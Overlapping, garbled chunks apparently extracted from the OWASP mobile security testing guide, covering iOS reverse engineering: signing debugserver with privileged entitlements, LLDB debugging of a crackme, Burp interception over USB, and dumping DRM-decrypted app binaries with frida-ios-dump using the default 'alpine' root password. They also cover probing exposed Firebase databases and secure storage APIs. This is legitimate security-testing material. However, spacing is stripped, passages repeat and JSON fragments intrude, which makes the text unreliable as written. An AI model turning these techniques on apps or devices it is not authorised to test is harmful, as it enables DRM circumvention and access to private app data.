You’llfindthedebugserverexecutableinthe/usr/bin/directoryonthemountedvolume. Copyittoatemporarydirec- tory,thencreateafilecalledentitlements.plistwiththefollowingcontent: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE plist PUBLIC\"-//Apple//DTDPLIST1.0//EN\"\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"> <plist version=\"1.0\"> <dict> <key>com.apple.springboard.debugapplications</key> <true/> <key>run-unsigned-code</key> <true/> <key>get-task-allow</key> <true/> <key>task_for_pid-allow</key> <true/> </dict> </plist> Applytheentitlementwithcodesign: codesign -s---entitlements entitlements.plist -fdebugserver Copythemodifiedbinarytoanydirectoryonthetestdevice. Thefollowingexamplesuseusbmuxdtoforwardalocalport throughUSB. iproxy222222 scp-P2222debugserverroot@localhost:/tmp/ Note: OniOS12andhigher,usethefollowingproceduretosignthedebugserverbinaryobtainedfromtheXCodeimage. 1) Copythedebugserverbinarytothedeviceviascp,forexample,inthe/tmpfolder. 2) ConnecttothedeviceviaSSHandcreatethefile,namedentitlements.xml,withthefollowingcontent: <!DOCTYPE plist PUBLIC\"-//Apple//DTD PLIST1.0//ENhttp://www.apple.com/DTDs/PropertyList-1.0.dtd\"> <plist version=\"1.0\"> <dict> <key>platform-application</key> <true/> <key>com.apple.private.security.no-container</key> <true/> <key>com.apple.private.skip-library-validation</key> <true/> <key>com.apple.backboardd.debugapplications</key> <true/> <key>com.apple.backboardd.launchapplications</key> <true/> <key>com.apple.diagnosticd.diagnostic</key> <true/> <key>com.apple.frontboard.debugapplications</key> <true/> <key>com.apple.frontboard.launchapplications</key> <true/> <key>com.apple.security.network.client</key> 385\\n<true/> <key>com.apple.security.network.server</key> <true/> <key>com.apple.springboard.debugapplications</key> <true/> <key>com.apple.system-task-ports</key> <true/> <key>get-task-allow</key> <true/> <key>run-unsigned-code</key> <true/> <key>task_for_pid-allow</key> <true/> </dict> </plist> 3) Typethefollowingcommandtosignthedebugserverbinary: ldid -Sentitlements.xml debugserver 4) Verifythatthedebugserverbinarycanbeexecutedviathefollowingcommand: ./debugserver Youcannowattachdebugservertoanyprocessrunningonthedevice. VP-iPhone-18:/tmproot#./debugserver *:1234 -a2670 debugserver-@(#)PROGRAM:debugserver PROJECT:debugserver-320.2.89 forarmv7. Attachingtoprocess2670... Withthefollowingcommandyoucanlaunchanapplicationviadebugserverrunningonthetargetdevice: debugserver -xbackboard *:1234/Applications/MobileSMS.app/MobileSMS Attachtoanalreadyrunningapplication: debugserver *:1234 -a\"MobileSMS\" YoumayconnectnowtotheiOSdevicefromyourhostcomputer: (lldb)processconnectconnect://<ip-of-ios-device>:1234 Typingimage listgivesalistofmainexecutableandalldependentlibraries. Debugging Release Apps In the previous section we learned about how to setup a debugging environment on an iOS device using LLDB. In this sectionwewillusethisinformationandlearnhowtodebuga3rdpartyreleaseapplication. Wewillcontinueusingthe UnCrackableAppforiOSLevel1andsolveitusingadebugger. Incontrast to a debugbuild, thecode compiled for a releasebuild is optimized toachieve maximum performanceand minimumbinarybuildsize. Asageneralbestpractice,mostofthedebugsymbolsarestrippedforareleasebuild,adding alayerofcomplexitywhenreverseengineeringanddebuggingthebinaries. Duetotheabsenceofthedebugsymbols,symbolnamesaremissingfromthebacktraceoutputsandsettingbreakpoints by simply using function names is not possible. Fortunately, debuggers also support setting breakpoints directly on memoryaddresses. Furtherinthissectionwewilllearnhowtodosoandeventuallysolvethecrackmechallenge. Somegroundworkisneededbeforesettingabreakpointusingmemoryaddresses. Itrequiresdeterminingtwooffsets: 1. Breakpointoffset: Theaddressoffsetofthecodewherewewanttosetabreakpoint. Thisaddressisobtainedby performingstaticanalysisofthecodeinadisassemblerlikeGhidra. 2. ASLRshiftoffset: TheASLRshiftoffsetforthecurrentprocess. SinceASLRoffsetisrandomlygeneratedonevery newinstanceofanapplication,thishastobeobtainedforeverydebuggingsessionindividually. Thisisdetermined usingthedebuggeritself. 386\\niOSisamodernoperatingsystemwithmultipletechniquesimplementedtomitigatecodeexecutionattacks, one such technique being Address Space Randomization Layout (ASLR). On every new execution of an application, a randomASLRshiftoffsetisgenerated,andvariousprocess’datastructuresareshiftedbythisoffset. Thefinalbreakpointaddresstobeusedinthedebuggeristhesumoftheabovetwoaddresses(Breakpointoffset+ASLR shiftoffset). Thisapproachassumesthattheimagebaseaddress(discussedshortly)usedbythedisassemblerandiOS isthesame,whichistruemostofthetime. WhenabinaryisopenedinadisassemblerlikeGhidra,itloadsabinarybyemulatingtherespectiveoperatingsystem’s loader. Theaddressatwhichthebinaryisloadediscalledimagebaseaddress. Allthecodeandsymbolsinsidethisbinary canbeaddressedusingaconstantaddressoffsetfromthisimagebaseaddress. InGhidra,theimagebaseaddresscan beobtainedbydeterminingtheaddressofthestartofaMach-Ofile. Inthiscase,itis0x100000000. FromourpreviousanalysisoftheUnCrackableLevel1applicationin“Manual(Reversed)CodeReview”section,thevalue ofthehiddenstringisstoredinalabelwiththehiddenflagset. Inthedisassembly,thetextvalueofthislabelisstored inregisterX21,storedviamovfromX0,atoffset0x100004520. Thisisourbreakpointoffset. Forthesecondaddress,weneedtodeterminetheASLRshiftoffsetforagivenprocess. TheASLRoffsetcanbedetermined byusingtheLLDBcommandimage list -o -f. Theoutputisshowninthescreenshotbelow. Intheoutput,thefirstcolumncontainsthesequencenumberoftheimage([X]),thesecondcolumncontainstherandomly generatedASLRoffset,while3rdcolumncontainsthefullpathoftheimageandtowardstheend,contentinthebracket shows the image base address after adding ASLR offset to the original image base address (0x100000000 + 0x70000 = 0x100070000). You will notice the image base address of 0x100000000 is same as in Ghidra. Now, to obtain the 387\\neffectivememoryaddressforacodelocationweonlyneedtoaddASLRoffsettotheaddressidentifiedinGhidra. The effectiveaddresstosetthebreakpointwillbe0x100004520+0x70000=0x100074520. Thebreakpointcanbesetusing commandb 0x100074520. Intheaboveoutput,youmayalsonoticethatmanyofthepathslistedasimagesdonotpointtothefilesystemonthe iOSdevice. Instead,theypointtoacertainlocationonthehostcomputeronwhichLLDBisrunning. Theseimages aresystemlibrariesforwhichdebugsymbolsareavailableonthehostcomputertoaidinapplicationdevelopment and debugging (as part of the Xcode iOS SDK). Therefore, you may set breakpoints to these libraries directly by usingfunctionnames. Afterputtingthebreakpointandrunningtheapp, theexecutionwillbehaltedoncethebreakpointishit. Nowyoucan access and explore the current state of the process. In this case, you know from the previous static analysis that the registerX0containsthehiddenstring,thuslet’sexploreit. InLLDByoucanprintObjective-Cobjectsusingthepo(print object)command. Voila, the crackme can be easily solved aided by static analysis and a debugger. There are plethora of features im- plemented in LLDB, including changing the value of the registers, changing values in the process memory and even automatingtasksusingPythonscripts. Officially Apple recommends use of LLDB for debugging purposes, but GDB can be also used on iOS. The techniques discussedaboveareapplicablewhiledebuggingusingGDBaswell,providedtheLLDBspecificcommandsarechanged toGDBcommands. Get Open Files Platform: ios lsofisapowerfulcommand,andprovidesaplethoraofinformationaboutarunningprocess. Itcanprovidealistofall openfiles, including a stream, a networkfile ora regularfile. Wheninvoking thelsof commandwithout anyoption it will list all open files belonging to all active processes on the system, while when invoking with the flags -c <process name>or-p <pid>,itreturnsthelistofopenfilesforthespecifiedprocess. Themanpageshowsvariousotheroptionsin detail. UsinglsofforaniOSapplicationrunningwithPID2828,listvariousopenfilesasshownbelow. iPhone:~root#lsof -p2828 COMMAND",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 133
    }
  },
  {
    "text": "toGDBcommands. Get Open Files Platform: ios lsofisapowerfulcommand,andprovidesaplethoraofinformationaboutarunningprocess. Itcanprovidealistofall openfiles, including a stream, a networkfile ora regularfile. Wheninvoking thelsof commandwithout anyoption it will list all open files belonging to all active processes on the system, while when invoking with the flags -c <process name>or-p <pid>,itreturnsthelistofopenfilesforthespecifiedprocess. Themanpageshowsvariousotheroptionsin detail. UsinglsofforaniOSapplicationrunningwithPID2828,listvariousopenfilesasshownbelow. iPhone:~root#lsof -p2828 COMMAND PID USER FD TYPEDEVICESIZE/OFF NODENAME iOweApp2828mobile cwd DIR 1,2 864 2/ iOweApp2828mobile txt REG 1,3 206144189774/private/var/containers/Bundle/Application/F390A491-3524-40EA-B3F8-6C1FA105A23A/iOweApp.app/iOweApp iOweApp2828mobile txt REG 1,3 5492213230/private/var/mobile/Containers/Data/Application/5AB3E437-9E2D-4F04-BD2B- ↪ 972F6055699E/tmp/com.apple.dyld/iOweApp-6346DC276FE6865055F1194368EC73CC72E4C5224537F7F23DF19314CF6FD8AA.closure iOweApp2828mobile txt REG 1,3 30628212198/private/var/preferences/Logging/.plist-cache.vqXhr1EE iOweApp2828mobile txt REG 1,2 50080234433/usr/lib/libobjc-trampolines.dylib iOweApp2828mobile txt REG 1,2 344204 74185/System/Library/Fonts/AppFonts/ChalkboardSE.ttc iOweApp2828mobile txt REG 1,2 664848234595/usr/lib/dyld ... 388\\nSetting up an Interception Proxy Platform: ios BurpSuiteisanintegratedplatformforsecuritytestingmobileandwebapplications. Itstoolsworktogetherseamlesslyto supporttheentiretestingprocess,frominitialmappingandanalysisofattacksurfacestofindingandexploitingsecurity vulnerabilities. Burp Proxy operates as a web proxy server for Burp Suite, which is positioned as a man-in-the-middle betweenthebrowserandwebserver(s). BurpSuiteallowsyoutointercept,inspect,andmodifyincomingandoutgoing rawHTTPtraffic. SettingupBurptoproxyyourtrafficisprettystraightforward. WeassumethatbothyouriOSdeviceandhostcomputer areconnectedtoaWi-Finetworkthatpermitsclient-to-clienttraffic. Ifclient-to-clienttrafficisnotpermitted,youcanuse usbmuxdtoconnecttoBurpviaUSB. PortSwiggerprovidesagoodtutorialonsettingupaniOSdevicetoworkwithBurpandatutorialoninstallingBurp’sCA certificatetoaniOSdevice. Using Burp via USB on a Jailbroken Device InthesectionAccessingtheDeviceShellwe’vealreadylearnedhowwecanuseiproxytouseSSHviaUSB.Whendoing dynamicanalysis,it’sinterestingtousetheSSHconnectiontorouteourtraffictoBurpthatisrunningonourcomputer. Let’sgetstarted: FirstweneedtouseiproxytomakeSSHfromiOSavailableonlocalhost. $iproxy222222 waitingforconnection Thenextstepistomakearemoteportforwardingofport8080ontheiOSdevicetothelocalhostinterfaceonourcomputer toport8080. ssh-R8080:localhost:8080root@localhost -p2222 YoushouldnowbeabletoreachBurponyouriOSdevice. OpenSafarioniOSandgoto127.0.0.1:8080andyoushould seetheBurpSuitePage. ThiswouldalsobeagoodtimetoinstalltheCAcertificateofBurponyouriOSdevice. ThelaststepwouldbetosettheproxygloballyonyouriOSdevice: 1. GotoSettings->Wi-Fi 2. ConnecttoanyWi-Fi(youcanliterallyconnecttoanyWi-Fiasthetrafficforport80and443willberoutedthrough USB,aswearejustusingtheProxySettingfortheWi-FisowecansetaglobalProxy) 3. OnceconnectedclickonthesmallblueiconontherightsideoftheconnectWi-Fi 4. ConfigureyourProxybyselectingManual 5. Typein127.0.0.1asServer 6. Typein8080asPort OpenSafariandgotoanywebpage,youshouldseenowthetrafficinBurp. Thanks@hweisheimerfortheinitialidea! Static Analysis on iOS Platform: ios ThepreferredmethodofstaticallyanalyzingiOSappsinvolvesusingtheoriginalXcodeprojectfiles. Ideally,youwillbe abletocompileanddebugtheapptoquicklyidentifyanypotentialissueswiththesourcecode. BlackboxanalysisofiOSappswithoutaccesstotheoriginalsourcecoderequiresreverseengineering. Forexample,no decompilersareavailableforiOSapps(althoughmostcommercialandopen-sourcedisassemblerscanprovideapseudo- sourcecodeviewofthebinary),soadeepinspectionrequiresyoutoreadassemblycode. 389\\nReverse Engineering iOS Apps Platform: ios iOSreverseengineeringisamixedbag. Ononehand,appsprogrammedinObjective-CandSwiftcanbedisassembled nicely. InObjective-C,objectmethodsarecalledviadynamicfunctionpointerscalled“selectors”,whichareresolvedby name during runtime. The advantage of runtime name resolution is that these names need to stay intact in the final binary,makingthedisassemblymorereadable. Unfortunately,thisalsomeansthatnodirectcross-referencesbetween methodsareavailableinthedisassemblerandconstructingaflowgraphischallenging. References • [#miller] - Charlie Miller, Dino Dai Zovi. The iOS Hacker’s Handbook. Wiley, 2012 - https://www.wiley.com/en- us/iOS+Hacker%27s+Handbook-p-9781118204122 • [#levin]JonathanLevin. MacOSXandiOSInternals: TotheApple’sCore. Wiley,2013-http://newosxbook.com/M OXiI.pdf Host-Device Data Transfer Platform: ios TheremightbevariousscenarioswhereyoumightneedtotransferdatafromtheiOSdeviceorappdatasandboxtoyour hostcomputerorviceversa. Thefollowingsectionwillshowyoudifferentwaysonhowtoachievethat. Copying App Data Files via SSH and SCP Asweknownow,filesfromourapparestoredintheDatadirectory. YoucannowsimplyarchivetheDatadirectorywith tarandpullitfromthedevicewithscp: iPhone:~root#tarczvf/tmp/data.tgz/private/var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693 iPhone:~root#exit $scp -P2222root@localhost:/tmp/data.tgz. Grapefruit AfterstartingGrapefruityoucanselecttheappthatisinscopefortesting. Therearevariousfunctionsavailable,ofwhich oneiscalled“Finder”. Whenselectingit,youwillgetalistingofthedirectoriesoftheappsandbox. 390\\nWhen navigating through the directories and selecting a file, a pop-up will show up and display the data either as hex- adecimalortext. Whenclosingthispop-upyouhavevariousoptionsavailableforthefile,including: • Databaseviewer • Plistviewer • Download Objection WhenyouarestartingobjectionyouwillfindthepromptwithintheBundledirectory. 391\\norg.owasp.MSTGon (iPhone:10.3.3)[usb] #pwdprint Currentdirectory:/var/containers/Bundle/Application/DABF849D-493E-464C-B66B-B8B6C53A4E76/org.owasp.MSTG.app UsetheenvcommandtogetthedirectoriesoftheappandnavigatetotheDocumentsdirectory. org.owasp.MSTGon (iPhone:10.3.3)[usb] #cd/var/mobile/Containers/Data/Application/72C7AAFB-1D75-4FBA-9D83-D8B4A2D44133/Documents /var/mobile/Containers/Data/Application/72C7AAFB-1D75-4FBA-9D83-D8B4A2D44133/Documents Withthecommandfile download <filename>youcandownloadafilefromtheiOSdevicetoyourhostcomputerand cananalyzeitafterwards. org.owasp.MSTGon (iPhone:10.3.3)[usb] #filedownload.com.apple.mobile_container_manager.metadata.plist Downloading/var/mobile/Containers/Data/Application/72C7AAFB-1D75-4FBA-9D83-D8B4A2D44133/.com.apple.mobile_container_manager.metadata.plistto ↪ .com.apple.mobile_container_manager.metadata.plist Streamingfilefromdevice... Writingbytestodestination... Successfullydownloaded/var/mobile/Containers/Data/Application/72C7AAFB-1D75-4FBA-9D83-D8B4A2D44133/.com.apple.mobile_container_manager.metadata.plistto ↪ .com.apple.mobile_container_manager.metadata.plist YoucanalsouploadfilestotheiOSdevicewithfile upload <local_file_path>. Dynamic Analysis on iOS Platform: ios Lifeiseasywithajailbrokendevice: notonlydoyougaineasyprivilegedaccesstothedevice,thelackofcodesigning allowsyoutousemorepowerfuldynamicanalysistechniques. OniOS,mostdynamicanalysistoolsarebasedonCydia Substrate,aframeworkfordevelopingruntimepatches,orFrida,adynamicintrospectiontool. ForbasicAPImonitoring, you can get away with not knowing all the details of how Substrate or Frida work - you can simply use existing API monitoringtools. On iOS, collecting basic information about a running process or an application can be slightly more challenging than compared to Android. On Android (or any Linux-based OS), process information is exposed as readable text files via procfs. Thus,anyinformationaboutatargetprocesscanbeobtainedonarooteddevicebyparsingthesetextfiles. In contrast,oniOSthereisnoprocfsequivalentpresent. Also,oniOSmanystandardUNIXcommandlinetoolsforexploring processinformation,forinstancelsofandvmmap,areremovedtoreducethefirmwaresize. Inthissection,wewilllearnhowtocollectprocessinformationoniOSusingcommandlinetoolslikelsof. Sincemanyof thesetoolsarenotpresentoniOSbydefault,weneedtoinstallthemviaalternativemethods. Forinstance,lsofcanbe installedusingCydia(theexecutableisnotthelatestversionavailable,butneverthelessaddressesourpurpose). Obtaining and Extracting Apps Platform: ios Getting the IPA File from an OTA Distribution Link Duringdevelopment,appsaresometimesprovidedtotestersviaover-the-air(OTA)distribution. Inthatsituation,you’ll receiveanitms-serviceslink,suchasthefollowing: itms-services://?action=download-manifest&url=https://s3-ap-southeast-1.amazonaws.com/test-uat/manifest.plist YoucanusetheITMSservicesassetdownloadertooltodownloadtheIPAfromanOTAdistributionURL.Installitvianpm: npminstall -gitms-services SavetheIPAfilelocallywiththefollowingcommand: 392\\n##itms-services-u\"itms-services://?action=download-manifest&url=https://s3-ap-southeast-1.amazonaws.com/test-uat/manifest.plist\"-o->out.ipa Extracting the App Binary If you have an IPA with a decrypted app binary, unzip it and you are ready to go. The app binary is located in the mainbundledirectory(.app),e.g.Payload/Telegram X.app/Telegram X.Seethefollowingsubsectionfordetailsonthe extractionofthepropertylists. OnmacOS’sFinder,.appdirectoriesareopenedbyright-clickingthemandselecting“ShowPackageContent”. On theterminalyoucanjustcdintothem. Decrypting the App Binary IMPORTANT NOTE:IntheUnitedStates,theDigitalMillenniumCopyrightAct17U.S.C.1201,orDMCA,makesit illegalandactionabletocircumventcertaintypesofDRM.However,theDMCAalsoprovidesexemptions,suchas forcertainkindsofsecurityresearch. Aqualifiedattorneycanhelpyoudetermineifyourresearchqualifiesunder theDMCAexemptions. (Source: Corellium) If you don’t have the original IPA, then you need a jailbroken device where you will install the",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 134
    }
  },
  {
    "text": "and you are ready to go. The app binary is located in the mainbundledirectory(.app),e.g.Payload/Telegram X.app/Telegram X.Seethefollowingsubsectionfordetailsonthe extractionofthepropertylists. OnmacOS’sFinder,.appdirectoriesareopenedbyright-clickingthemandselecting“ShowPackageContent”. On theterminalyoucanjustcdintothem. Decrypting the App Binary IMPORTANT NOTE:IntheUnitedStates,theDigitalMillenniumCopyrightAct17U.S.C.1201,orDMCA,makesit illegalandactionabletocircumventcertaintypesofDRM.However,theDMCAalsoprovidesexemptions,suchas forcertainkindsofsecurityresearch. Aqualifiedattorneycanhelpyoudetermineifyourresearchqualifiesunder theDMCAexemptions. (Source: Corellium) If you don’t have the original IPA, then you need a jailbroken device where you will install the app (e.g. via App Store). Once installed, you need to extract the app binary from memory and rebuild the IPA file. Because of DRM, the app binaryfileisencryptedwhenitisstoredontheiOSdevice,sosimplypullingitfromtheBundle(eitherthroughSSHor Objection)willnotbesufficienttoreverseengineerit. Youcanverifythisbyrunningthiscommandontheappbinary: otool -lPayload/TelegramX.app/TelegramX |grep -iLC_ENCRYPTION -B1-A4 Loadcommand12 cmdLC_ENCRYPTION_INFO cmdsize20 cryptoff16384 cryptsize32768 cryptid1 Orwithradare2: rabin2 -IPayload/TelegramX.app/TelegramX |grep crypto crypto true In order to retrieve the unencrypted version, you can use frida-ios-dump. It will extract the unencrypted version from memorywhiletheapplicationisrunningonthedevice. First,configureFrida-ios-dumpdump.py: • setittouselocalhostwithport2222whenusingiproxy,ortotheactualIPaddressandportofthedevicefrom whichyouwanttodumpthebinary. • updatethedefaultusername(User = 'root')andpassword(Password = 'alpine')indump.pytotheonesyou haveset. Enumeratetheappsinstalledonthedevicebyrunningpython dump.py -l: PID Name Identifier ---- --------------- ------------------------------------- 860 Cydia com.saurik.Cydia 1130 Settings com.apple.Preferences 685 Mail com.apple.mobilemail 834 Telegram ph.telegra.Telegraph - Stocks com.apple.stocks ... Youcandumptheselectedapp,forexampleTelegram,byrunningpython dump.py ph.telegra.Telegraph 393\\nAfteracoupleofseconds, theTelegram.ipafilewillbecreatedinyourcurrentdirectory. Youcanvalidatethesuccess ofthedumpbyremovingtheappandreinstallingit(e.g.usingios-deployios-deploy -b Telegram.ipa). Notethatthis willonlyworkonjailbrokendevices,asotherwisethesignaturewon’tbevalid. Youcanverifythattheappbinaryisnowunencrypted: rabin2 -IPayload/TelegramX.app/TelegramX |grep crypto crypto false Thinning the App Binary The app binary may contain multiple architectures, such as armv7 (32-bit) and arm64 (64-bit). That is called a “fat bi- nary”. OneexampleistheDamnVulnerableiOSAppDVIAv1todemonstratethis. Unziptheappandrunotool: unzip DamnVulnerableiOSApp.ipa cdPayload/DamnVulnerableIOSApp.app otool -hvDamnVulnerableIOSApp Theoutputwilllooklikethis: DamnVulnerableIOSApp (architecturearmv7): Machheader magic cputypecpusubtype caps filetypencmdssizeofcmds flags MH_MAGIC ARM V7 0x00 EXECUTE 33 3684 NOUNDEFSDYLDLINKTWOLEVELPIE DamnVulnerableIOSApp (architecturearm64): Machheader magic cputypecpusubtype caps filetypencmdssizeofcmds flags MH_MAGIC_64 ARM64 ALL 0x00 EXECUTE 33 4192 NOUNDEFSDYLDLINKTWOLEVELPIE Toeasetheappanalysis,it’srecommendedcreateaso-calledthinbinary,whichcontainsonearchitectureonly: lipo -thin armv7DamnVulnerableIOSApp -output DVIA32 Execution Tracing Platform: ios Tracinginvolvesrecordingtheinformationaboutaprogram’sexecution. IncontrasttoAndroid,therearelimitedoptions available for tracing various aspects of an iOS app. In this section we will be heavily relying on tools such as Frida for performingtracing. TODO:Thisneedstobeimprovedaswell Reviewing Disassembled Native Code Platform: ios Analyzingdisassemblednativecoderequiresagoodunderstandingofthecallingconventionsandinstructionsusedby theunderlyingplatform. InthissectionwearelookinginARM64disassemblyofthenativecode. Agoodstartingpointto learnaboutARMarchitectureisavailableatIntroductiontoARMAssemblyBasicsbyAzeriaLabsTutorials. Thisisaquick summaryofthethingsthatwewillbeusinginthissection: • InARM64,aregisterisof64bitinsizeandreferredtoasXn,wherenisanumberfrom0to31. Ifthelower(LSB) 32bitsoftheregisterareusedthenit’sreferredtoasWn. • TheinputparameterstoafunctionarepassedintheX0-X7registers. • ThereturnvalueofthefunctionispassedviatheX0register. 394\\n• Load(LDR)andstore(STR)instructionsareusedtoreadorwritetomemoryfrom/toaregister. • B,BL,BLXarebranchinstructionsusedforcallingafunction. As mentioned above as well, Objective-C code is also compiled to native binary code, but analyzing C/C++ native can bemorechallenging. IncaseofObjective-Ctherearevarioussymbols(especiallyfunctionnames)present,whicheases the understanding of the code. In the above section we’ve learned that the presence of function names like setText, isEqualStringscanhelpusinquicklyunderstandingthesemanticsofthecode. IncaseofC/C++nativecode,ifallthe binariesarestripped,therecanbeveryfewornosymbolspresenttoassistusintoanalyzingit. Decompilerscanhelpusinanalyzingnativecode, buttheyshouldbeusedwithcaution. Moderndecompilersarevery sophisticatedandamongmanytechniquesusedbythemtodecompilecode,afewofthemareheuristicsbased. Heuristics basedtechniquesmightnotalwaysgivecorrectresults,onesuchcasebeing,determiningthenumberofinputparameters for a given native function. Having knowledge of analyzing disassembled code, assisted with decompilers can make analyzingnativecodelesserrorprone. WewillbeanalyzingthenativefunctionidentifiedinviewDidLoadfunctionintheprevioussection. Thefunctionislocated atoffset0x1000080d4. ThereturnvalueofthisfunctionusedinthesetTextfunctioncallforthelabel. Thistextisused tocompareagainsttheuserinput. Thus,wecanbesurethatthisfunctionwillbereturningastringorequivalent. Thefirstthingwecanseeinthedisassemblyofthefunctionisthatthereisnoinputtothefunction. TheregistersX0-X7 are not read throughout the function. Also, there are multiple calls to other functions like the ones at 0x100008158, 0x10000dbf0etc. Theinstructionscorrespondingtoonesuchfunctioncallscanbeseenbelow. Thebranchinstructionblisusedtocallthe functionat0x100008158. 395\\n1000080f01a 000094 bl FUN_100008158 1000080f4 60020039 strb w0,[x19]=>DAT_10000dbf0 Thereturnvaluefromthefunction(foundinW0),isstoredtotheaddressinregisterX19(strbstoresabytetotheaddress inregister). Wecanseethesamepatternforotherfunctioncalls,thereturnedvalueisstoredinX19registerandeach timetheoffsetisonemorethanthepreviousfunctioncall. Thisbehaviorcanbeassociatedwithpopulatingeachindex ofastringarrayatatime. Eachreturnvalueisbeenwrittentoanindexofthisstringarray. Thereare11suchcalls,and fromthecurrentevidencewecanmakeanintelligentguessthatlengthofthehiddenflagis11. Towardstheendofthe disassembly,thefunctionreturnswiththeaddresstothisstringarray. 100008148 e00313aa mov x0=>DAT_10000dbf0,x19 To determine the value of the hidden flag we need to know the return value of each of the subsequent function calls identifiedabove. Whenanalyzingthefunction0x100006fb4,wecanobservethatthisfunctionismuchbiggerandmore complexthanthepreviousoneweanalyzed. Functiongraphscanbeveryhelpfulwhenanalyzingcomplexfunctions,as ithelpsintobetterunderstandingthecontrolflowofthefunction. FunctiongraphscanbeobtainedinGhidrabyclicking theDisplayfunctiongraphiconinthesub-menu. Manuallyanalyzingallthenativefunctionscompletelywillbetimeconsumingandmightnotbethewisestapproach. In suchascenario usinga dynamicanalysis approachishighly recommended. Forinstance, by usingthe techniqueslike 396\\nhookingorsimplydebuggingtheapplication,wecaneasilydeterminethereturnedvalues. Normallyit’sagoodideato useadynamicanalysisapproachandthenfallbacktomanuallyanalyzingthefunctionsinafeedbackloop. Thiswayyou canbenefitfrombothapproachesatthesametimewhilesavingtimeandreducingeffort. Dynamicanalysistechniques arediscussedin“DynamicAnalysis”section. 397\\niOS Data Storage Overview Theprotectionofsensitivedata,suchasauthenticationtokensandprivateinformation,iskeyformobilesecurity. Inthis chapter,you’lllearnabouttheiOSAPIsforlocaldatastorage,andbestpracticesforusingthem. As little sensitive data as possible should be saved in permanent local storage. However, in most practical scenarios, atleastsomeuserdatamustbestored. Fortunately,iOSofferssecurestorageAPIs,whichallowdeveloperstousethe cryptographichardwareavailableoneveryiOS device. IftheseAPIs areusedcorrectly, sensitivedataand filescanbe securedviahardware-backed256-bitAESencryption. NSData",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 135
    }
  },
  {
    "text": "usinga dynamicanalysis approachishighly recommended. Forinstance, by usingthe techniqueslike 396\\nhookingorsimplydebuggingtheapplication,wecaneasilydeterminethereturnedvalues. Normallyit’sagoodideato useadynamicanalysisapproachandthenfallbacktomanuallyanalyzingthefunctionsinafeedbackloop. Thiswayyou canbenefitfrombothapproachesatthesametimewhilesavingtimeandreducingeffort. Dynamicanalysistechniques arediscussedin“DynamicAnalysis”section. 397\\niOS Data Storage Overview Theprotectionofsensitivedata,suchasauthenticationtokensandprivateinformation,iskeyformobilesecurity. Inthis chapter,you’lllearnabouttheiOSAPIsforlocaldatastorage,andbestpracticesforusingthem. As little sensitive data as possible should be saved in permanent local storage. However, in most practical scenarios, atleastsomeuserdatamustbestored. Fortunately,iOSofferssecurestorageAPIs,whichallowdeveloperstousethe cryptographichardwareavailableoneveryiOS device. IftheseAPIs areusedcorrectly, sensitivedataand filescanbe securedviahardware-backed256-bitAESencryption. NSData and NSMutableData NSData(staticdataobjects)andNSMutableData(dynamicdataobjects)aretypicallyusedfordatastorage,buttheyare alsousefulfordistributedobjectsapplications,inwhichdatacontainedindataobjectscanbecopiedormovedbetween applications. ThefollowingaremethodsusedtowriteNSDataobjects: • NSDataWritingWithoutOverwriting • NSDataWritingFileProtectionNone • NSDataWritingFileProtectionComplete • NSDataWritingFileProtectionCompleteUnlessOpen • NSDataWritingFileProtectionCompleteUntilFirstUserAuthentication • writeToFile: storesdataaspartoftheNSDataclass • NSSearchPathForDirectoriesInDomains, NSTemporaryDirectory: usedtomanagefilepaths • NSFileManager: letsyouexamineandchangethecontentsofthefilesystem. YoucanusecreateFileAtPathto createafileandwritetoit. ThefollowingexampleshowshowtocreateacompleteencryptedfileusingtheFileManagerclass. Youcanfindmore informationintheAppleDeveloperDocumentation“EncryptingYourApp’sFiles” Swift: FileManager.default.createFile( atPath:filePath, contents:\"secrettext\".data(using:.utf8), attributes:[FileAttributeKey.protectionKey:FileProtectionType.complete] ) Objective-C: [[NSFileManagerdefaultManager]createFileAtPath:[self filePath] contents:[@\"secrettext\" dataUsingEncoding:NSUTF8StringEncoding] attributes:[NSDictionarydictionaryWithObject:NSFileProtectionComplete forKey:NSFileProtectionKey]]; NSUserDefaults TheNSUserDefaultsclassprovidesaprogrammaticinterfaceforinteractingwiththedefaultsystem. Thedefaultsystem allows an application to customize its behavior according to user preferences. Data saved by NSUserDefaults can be viewed in the application bundle. This class stores data in a plist file, but it’s meant to be used with small amounts of data. Databases CoreData 398\\nCoreDataisaframeworkformanagingthemodellayerofobjectsinyourapplication. Itprovidesgeneralandautomated solutionstocommontasksassociatedwithobjectlifecyclesandobjectgraphmanagement,includingpersistence. Core DatacanuseSQLiteasitspersistentstore,buttheframeworkitselfisnotadatabase. CoreDatadoesnotencryptit’sdatabydefault. Aspartofaresearchproject(iMAS)fromtheMITRECorporation,thatwas focusedonopensourceiOSsecuritycontrols,anadditionalencryptionlayercanbeaddedtoCoreData. SeetheGitHub Repoformoredetails. SQLite Databases TheSQLite3librarymustbeaddedtoanappiftheappistouseSQLite. ThislibraryisaC++wrapperthatprovidesan APIfortheSQLitecommands. Firebase Real-time Databases Firebaseisadevelopmentplatformwithmorethan15products,andoneofthemisFirebaseReal-timeDatabase. Itcan beleveragedbyapplicationdeveloperstostoreandsyncdatawithaNoSQLcloud-hosteddatabase. Thedataisstored asJSONandissynchronizedinreal-timetoeveryconnectedclientandalsoremainsavailableevenwhentheapplication goesoffline. AmisconfiguredFirebaseinstancecanbeidentifiedbymakingthefollowingnetworkcall: https://\\<firebaseProjectName\\>.firebaseio.com/.json The firebaseProjectName can be retrieved from the property list(.plist) file. For example, PROJECT_ID key stores the correspondingFirebaseprojectnameinGoogleService-Info.plistfile. Alternatively,theanalystscanuseFirebaseScanner,apythonscriptthatautomatesthetaskaboveasshownbelow: pythonFirebaseScanner.py -f<commaSeparatedFirebaseProjectNames> Realm Databases Realm Objective-C and Realm Swift aren’t supplied by Apple, but they are still worth noting. They store everything unencrypted,unlesstheconfigurationhasencryptionenabled. ThefollowingexampledemonstrateshowtouseencryptionwithaRealmdatabase: //OpentheencryptedRealmfilewheregetKey()isamethodtoobtainakeyfromtheKeychainora server letconfig =Realm.Configuration(encryptionKey:getKey()) do{ letrealm =tryRealm(configuration:config) //UsetheRealmasnormal }catch leterror asNSError { //Iftheencryptionkeyiswrong,`error`willsaythatit'saninvaliddatabase fatalError(\"Erroropeningrealm: \\(error)\") } Couchbase 